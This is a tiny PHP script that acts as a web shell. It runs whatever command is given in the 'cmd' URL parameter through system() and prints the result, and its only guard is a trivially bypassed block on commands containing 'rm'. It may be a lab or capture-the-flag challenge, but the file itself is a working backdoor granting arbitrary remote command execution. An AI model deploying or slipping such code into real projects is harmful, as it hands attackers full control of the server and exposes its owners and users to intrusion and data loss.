<?php
if(str_contains($_GET['cmd'], 'rm')) {
    echo "Access denied!";
    return;
}
if (isset($_GET['cmd'])) 
{
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
else {
    echo "Specify <b>cmd</b> parameter";
}